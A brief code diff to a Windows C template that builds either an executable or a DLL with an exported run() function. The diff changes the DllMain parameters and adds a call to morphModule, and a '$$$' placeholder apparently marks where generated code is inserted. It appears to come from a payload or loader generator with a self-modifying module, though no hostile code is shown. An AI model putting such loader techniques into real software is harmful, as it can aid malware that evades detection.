@@ -30,7 +30,8 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 #elif CONFIG_MAKE == 1
 __declspec(dllexport) VOID run();
 
-BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved){
+BOOL APIENTRY DllMain(HINSTANCE hinstDLL,  DWORD  ul_reason_for_call, LPVOID lpReserved){
+    morphModule(hinstDLL);
     $$$
     switch (ul_reason_for_call){
 
